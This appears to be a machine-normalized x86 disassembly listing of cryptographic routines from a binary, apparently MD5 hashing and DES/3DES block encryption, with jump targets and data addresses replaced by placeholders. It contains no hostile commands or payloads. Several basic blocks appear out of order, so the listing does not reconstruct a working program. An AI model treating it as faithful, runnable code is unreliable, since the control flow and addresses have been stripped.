add edx [ ebp - 0x10 ]
lea esi [ esi + edx - 0x546bdc59 ]
mov edx esi
shl esi 0xf
shr edx 0x11
or edx esi
add edx ecx
mov esi eax
not esi
or esi edx
xor esi ecx
add esi [ ebp - 0x34 ]
lea edi [ edi + esi - 0x36c5fc7 ]
mov esi edi
shr edi 0xb
shl esi 0x15
or esi edi
mov edi ecx
not edi
add esi edx
or edi esi
xor edi edx
add edi [ ebp - 0x18 ]
lea edi [ eax + edi + 0x655b59c3 ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
add eax esi
mov edi edx
not edi
or edi eax
xor edi esi
add edi [ ebp - 0x3c ]
lea edi [ ecx + edi - 0x70f3336e ]
mov ecx edi
shl edi 0xa
shr ecx 0x16
or ecx edi
mov edi esi
add ecx eax
not edi
or edi ecx
xor edi eax
add edi [ ebp - 0x20 ]
lea edi [ edx + edi - 0x100b83 ]
mov edx edi
shl edi 0xf
shr edx 0x11
or edx edi
add edx ecx
mov edi eax
not edi
or edi edx
xor edi ecx
add edi [ ebp - 0x44 ]
lea edi [ esi + edi - 0x7a7ba22f ]
mov esi edi
shr edi 0xb
shl esi 0x15
or esi edi
add esi edx
mov edi ecx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x28 ]
lea edi [ eax + edi + 0x6fa87e4f ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
add eax esi
mov edi edx
not edi
or edi eax
xor edi esi
add edi [ ebp - 0xc ]
lea edi [ ecx + edi - 0x1d31920 ]
mov ecx edi
shl edi 0xa
shr ecx 0x16
or ecx edi
add ecx eax
mov edi esi
not edi
or edi ecx
xor edi eax
add edi [ ebp - 0x30 ]
lea edi [ edx + edi - 0x5cfebcec ]
mov edx edi
shl edi 0xf
shr edx 0x11
or edx edi
mov edi eax
not edi
add edx ecx
or edi edx
xor edi ecx
add edi [ ebp - 0x14 ]
lea edi [ esi + edi + 0x4e0811a1 ]
mov esi edi
shr edi 0xb
shl esi 0x15
or esi edi
add esi edx
mov edi ecx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x38 ]
lea eax [ eax + edi - 0x8ac817e ]
mov edi eax
shl eax 0x6
shr edi 0x1a
or edi eax
mov eax edx
not eax
add edi esi
or eax edi
xor eax esi
add eax [ ebp - 0x1c ]
lea eax [ ecx + eax - 0x42c50dcb ]
mov ecx eax
shl eax 0xa
shr ecx 0x16
or ecx eax
add ecx edi
mov eax esi
not eax
or eax ecx
xor eax edi
add eax [ ebp - 0x40 ]
push 0x40
lea edx [ edx + eax + 0x2ad7d2bb ]
mov ebx edx
shl edx 0xf
shr ebx 0x11
or ebx edx
add ebx ecx
mov eax edi
not eax
or eax ebx
xor eax ecx
add eax [ ebp - 0x24 ]
push 0x0
lea esi [ esi + eax - 0x14792c6f ]
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
add edi edx
mov edx esi
shl edx 0x15
shr esi 0xb
or edx esi
add edx [ eax + 0x4 ]
mov [ eax ] edi
add edx ebx
mov [ eax + 0x4 ] edx
mov edx [ eax + 0x8 ]
add edx ebx
mov [ eax + 0x8 ] edx
mov edx [ eax + 0xc ]
add edx ecx
mov [ eax + 0xc ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_1000d091
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
sub_1000e22a
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
cmp ecx edx
mov [ esi + 0x10 ] ecx
jae r-xdata
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
and [ ebp + 0x8 ] 0x0
push ebx
push [ ebp + 0xc ]
lea eax [ eax + esi + 0x18 ]
push eax
call sub_1000d0aa
lea ecx [ esi + 0x18 ]
push esi
call sub_1000d9c4
add esp 0x10
mov [ ebp + 0x8 ] ebx
add ebx 0x3f
jmp r-xdata
cmp ebx edi
jb r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ eax + ebx - 0x3f ]
push esi
call sub_1000d9c4
add [ ebp + 0x8 ] 0x40
pop ecx
add ebx 0x40
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
sub edi ecx
push edi
add ecx edx
push ecx
lea eax [ eax + esi + 0x18 ]
push eax
call sub_1000d0aa
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000e2c5
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0xc ]
lea esi [ edi + 0x10 ]
push 0x8
pop edx
mov eax esi
lea ecx [ ebp - 0x8 ]
call sub_1000d993
mov eax [ esi ]
shr eax 0x3
push 0x38
and eax 0x3f
pop ecx
cmp eax ecx
jb r-xdata
sub ecx eax
push ecx
push rw-data
push edi
call sub_1000e22a
push 0x8
lea eax [ ebp - 0x8 ]
push eax
push edi
call sub_1000e22a
mov ecx [ ebp + 0x8 ]
push 0x10
pop edx
mov eax edi
call sub_1000d993
push 0x58
push 0x0
push edi
call sub_1000d091
add esp 0x24
pop edi
pop esi
leave
retn
push 0x78
pop ecx
sub_1000e346
mov ecx [ esp + 0x8 ]
movzx edx [ ecx ]
mov eax [ esp + 0x4 ]
shl edx 0x18
mov [ eax ] edx
inc ecx
movzx edx [ ecx ]
shl edx 0x10
or [ eax ] edx
xor edx edx
inc ecx
mov dh [ ecx ]
or [ eax ] edx
inc ecx
movzx edx [ ecx ]
or [ eax ] edx
inc ecx
movzx edx [ ecx ]
shl edx 0x18
add eax 0x4
mov [ eax ] edx
inc ecx
movzx edx [ ecx ]
shl edx 0x10
or [ eax ] edx
inc ecx
xor edx edx
mov dh [ ecx ]
or [ eax ] edx
movzx ecx [ ecx + 0x1 ]
mov edx [ eax ]
or ecx edx
mov [ eax ] ecx
retn
sub_1000e393
mov ecx [ esp + 0x8 ]
mov dl [ ecx + 0x3 ]
mov eax [ esp + 0x4 ]
mov [ eax ] dl
mov dl [ ecx + 0x2 ]
inc eax
mov [ eax ] dl
mov dl [ ecx + 0x1 ]
inc eax
mov [ eax ] dl
mov dl [ ecx ]
add ecx 0x4
inc eax
mov [ eax ] dl
mov dl [ ecx + 0x3 ]
inc eax
mov [ eax ] dl
mov dl [ ecx + 0x2 ]
inc eax
mov [ eax ] dl
mov dl [ ecx + 0x1 ]
inc eax
mov [ eax ] dl
mov cl [ ecx ]
mov [ eax + 0x1 ] cl
retn
sub_1000e3cc
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov esi ecx
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ecx
mov [ ebp + 0x8 ] 0x10
setne cl
mov ebx 0x3f00
lea ecx [ ecx * 4 - 0x3 ]
shl ecx 0x2
mov [ ebp - 0x4 ] ecx
add eax 0x78
mov edi esi
mov edx [ edi ]
and edx 0xfc0000
shl edx 0x6
mov [ eax ] edx
mov ecx [ edi ]
and ecx 0xfc0
shl ecx 0xa
or ecx edx
mov [ eax ] ecx
add esi 0x4
mov edx [ esi ]
shr edx 0xa
and edx ebx
or edx ecx
mov [ eax ] edx
mov ecx [ esi ]
shr ecx 0x6
and ecx 0x3f
or ecx edx
mov [ eax ] ecx
mov edx [ edi ]
and edx 0x3f000
shl edx 0xc
add eax 0x4
mov [ eax ] edx
mov ecx [ edi ]
and ecx 0x3f
shl ecx 0x10
or ecx edx
mov [ eax ] ecx
mov edx [ esi ]
shr edx 0x4
and edx ebx
or edx ecx
mov [ eax ] edx
mov ecx [ esi ]
and ecx 0x3f
or ecx edx
mov [ eax ] ecx
add eax [ ebp - 0x4 ]
add esi 0x4
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000e477
push ebx
push ebp
push esi
push edi
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx edx
shr ecx 0x4
xor ecx eax
and ecx 0xf0f0f0f
xor eax ecx
shl ecx 0x4
xor edx ecx
mov ecx edx
shr ecx 0x10
xor ecx eax
and ecx 0xffff
xor eax ecx
shl ecx 0x10
xor edx ecx
mov ecx eax
shr ecx 0x2
xor ecx edx
and ecx 0x33333333
xor edx ecx
shl ecx 0x2
xor eax ecx
mov ecx eax
shr ecx 0x8
xor ecx edx
and ecx 0xff00ff
xor edx ecx
shl ecx 0x8
xor eax ecx
mov ecx [ esp + 0x18 ]
mov esi eax
add eax eax
shr esi 0x1f
or esi eax
mov eax esi
xor eax edx
and eax 0xaaaaaaaa
xor esi eax
xor edx eax
mov edi esi
shl edi 0x1c
mov eax esi
shr eax 0x4
or edi eax
xor edi [ ecx ]
mov eax edx
shr eax 0x1f
add edx edx
or eax edx
mov ebx edi
shr ebx 0x18
push 0x3f
pop edx
and ebx edx
xor eax [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x10
and ebx edx
xor eax [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x8
and ebx edx
xor eax [ ebx * 4 + rw-data ]
and edi edx
xor eax [ edi * 4 + rw-data ]
mov edi [ ecx + 0x4 ]
xor edi esi
mov ebx edi
shr ebx 0x18
mov ebp edi
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x8 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0xc ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x10 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x14 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x18 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x1c ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x20 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x24 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x28 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x2c ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x30 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x34 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and edi edx
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x38 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x3c ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x40 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x44 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x48 ]
mov ebx edi
shr ebx 0x18
mov ebp edi
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x4c ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x50 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x54 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x58 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x5c ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x60 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x64 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x68 ]
mov ebx edi
shr ebx 0x18
mov ebp edi
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x6c ]
xor esi ebx
xor edi eax
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor esi ebx
mov edi esi
shl edi 0x1c
mov ebx esi
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x70 ]
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
mov edi [ ecx + 0x74 ]
xor eax ebx
xor edi esi
mov ebx edi
shr ebx 0x18
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
mov ebp edi
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor eax ebx
mov edi eax
shl edi 0x1c
mov ebx eax
shr ebx 0x4
or edi ebx
xor edi [ ecx + 0x78 ]
mov ecx [ ecx + 0x7c ]
mov ebx edi
shr ebx 0x18
mov ebp edi
and ebx edx
mov ebx [ ebx * 4 + rw-data ]
shr ebp 0x10
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
mov ebp edi
shr ebp 0x8
and ebp edx
xor ebx [ ebp * 4 + rw-data ]
and edi edx
xor ebx [ edi * 4 + rw-data ]
xor ecx eax
mov edi ecx
xor esi ebx
shr edi 0x18
mov ebx ecx
and edi edx
shr ebx 0x10
mov edi [ edi * 4 + rw-data ]
and ebx edx
xor edi [ ebx * 4 + rw-data ]
mov ebx ecx
and ecx edx
shr ebx 0x8
and ebx edx
xor edi [ ebx * 4 + rw-data ]
xor edi [ ecx * 4 + rw-data ]
xor esi edi
mov ecx esi
shl ecx 0x1f
shr esi 0x1
or ecx esi
mov edx ecx
xor edx eax
and edx 0xaaaaaaaa
xor eax edx
xor ecx edx
mov edx eax
shr eax 0x1
shl edx 0x1f
or edx eax
mov eax edx
shr eax 0x8
xor eax ecx
and eax 0xff00ff
xor ecx eax
shl eax 0x8
xor edx eax
mov eax edx
shr eax 0x2
xor eax ecx
and eax 0x33333333
xor ecx eax
shl eax 0x2
xor edx eax
mov eax ecx
shr eax 0x10
xor eax edx
and eax 0xffff
xor edx eax
shl eax 0x10
xor ecx eax
mov eax ecx
shr eax 0x4
xor eax edx
and eax 0xf0f0f0f
mov esi eax
shl esi 0x4
xor esi ecx
mov ecx [ esp + 0x14 ]
pop edi
mov [ ecx ] esi
pop esi
xor eax edx
pop ebp
mov [ ecx + 0x4 ] eax
pop ebx
retn
sub_1000ed53
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x14 ]
test al 0x7
je r-xdata
shr eax 0x3
je r-xdata
mov eax 0x406
leave
retn
push 0x8
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_1000d091
push 0x8
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1000d091
add esp 0x18
xor eax eax
leave
retn
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp + 0x14 ] ecx
sub edi ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x180 ]
xor eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x184 ]
xor eax [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi + 0x180 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ esi + 0x180 ]
xor [ ebp - 0xc ] eax
mov eax [ esi + 0x184 ]
xor [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x180 ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_1000e477
lea eax [ esi + 0x80 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_1000e477
lea eax [ esi + 0x100 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_1000e477
add esp 0x18
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
add eax edi
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_1000e346
mov ebx [ esi + 0x190 ]
test ebx ebx
pop ecx
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
mov [ esi + 0x184 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x14 ]
call sub_1000e393
add [ ebp + 0x14 ] 0x8
dec [ ebp - 0x4 ]
pop ecx
pop ecx
jne r-xdata
sub_1000ee64
push ebp
mov ebp esp
sub esp 0xf4
push ebx
push esi
xor ebx ebx
push edi
xor ecx ecx
movzx eax [ ecx + rw-data ]
mov esi [ ebp + 0xc ]
mov edx eax
sar edx 0x3
mov dl [ edx + esi ]
and eax 0x7
test [ eax * 2 + rw-data ] dl
setne al
mov [ ebp + ecx - 0x74 ] al
inc ecx
cmp ecx 0x38
jl r-xdata
mov [ ebp - 0x4 ] ebx
mov bl [ ebp + edi - 0x90 ]
mov bl [ ebp + edi - 0x74 ]
jmp r-xdata
cmp edi 0x1c
jge r-xdata
push 0x1c
pop edi
add eax edi
mov [ ebp + edx - 0x3c ] bl
inc edx
inc edi
cmp edx 0x1c
jl r-xdata
mov dl [ ebp + eax - 0x90 ]
mov dl [ ebp + eax - 0x74 ]
jmp r-xdata
cmp eax 0x38
jge r-xdata
xor ebx ebx
xor eax eax
mov [ ebp + edi - 0x3c ] dl
inc edi
inc eax
cmp edi 0x38
jl r-xdata
movzx edx [ edx ]
cmp [ ebp + edx - 0x3c ] bl
je r-xdata
mov edi [ eax * 4 + rw-data ]
or [ esi ] edi
inc eax
cmp eax 0x18
jl r-xdata
mov edx [ eax * 4 + rw-data ]
or [ ecx ] edx
lea edx [ eax + rw-data ]
movzx edi [ edx - 0x18 ]
cmp [ ebp + edi - 0x3c ] bl
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x10
jl r-xdata
mov edi [ ebp - 0x4 ]
lea eax [ edi + edi ]
lea ecx [ ebp + eax * 4 - 0xf0 ]
lea esi [ ebp + eax * 4 - 0xf4 ]
movzx eax [ edi + rw-data ]
mov [ ecx ] ebx
mov [ esi ] ebx
xor edx edx
mov edi eax
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xf4 ]
call sub_1000e3cc
push 0x38
lea eax [ ebp - 0x74 ]
push ebx
push eax
call sub_1000d091
push 0x38
lea eax [ ebp - 0x3c ]
push ebx
push eax
call sub_1000d091
push 0x80
lea eax [ ebp - 0xf4 ]
push ebx
push eax
call sub_1000d091
add esp 0x28
pop edi
pop esi
pop ebx
leave
retn
sub_1000ef87
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
lea eax [ esi + 0x180 ]
push eax
mov [ esi + 0x190 ] ebx
call sub_1000e346
push [ ebp + 0x10 ]
lea eax [ esi + 0x188 ]
push eax
call sub_1000e346
mov edi [ ebp + 0xc ]
add esp 0x10
test ebx ebx
mov eax edi
jne r-xdata
push ebx
push eax
push esi
call sub_1000ee64
xor eax eax
test ebx ebx
sete al
push eax
lea eax [ edi + 0x8 ]
push eax
lea eax [ esi + 0x80 ]
push eax
call sub_1000ee64
add esp 0x18
test ebx ebx
je r-xdata
lea eax [ edi + 0x10 ]
push ebx
push edi
add esi 0x100
push esi
call sub_1000ee64
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0x10
sub_1000f006
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x210
push ebx
push esi
push edi
push [ ebp + 0x7c ]
mov esi eax
push [ ebp + 0x78 ]
lea eax [ ebp - 0x1c ]
push 0x21
pop ebx
push ebx
push eax
call sub_1000f651
mov edi 0x80
push edi
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebp - 0xa0 ]
push ebx
push eax
call sub_1000f651
push edi
lea eax [ esi + 0x82 ]
push eax
lea eax [ ebp - 0x124 ]
push ebx
push eax
call sub_1000f651
lea eax [ ebp - 0xa0 ]
push ebx
push eax
call sub_1000f859
mov edi eax
lea eax [ ebp - 0x124 ]
push ebx
push eax
call sub_1000f859
add esp 0x40
mov ebx eax
push edi
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_1000f800
add esp 0xc
test eax eax
jl r-xdata
movzx eax [ esi ]
add eax 0x7
push 0x8
pop ecx
cdq
idiv ecx
mov esi [ ebp + 0x74 ]
push edi
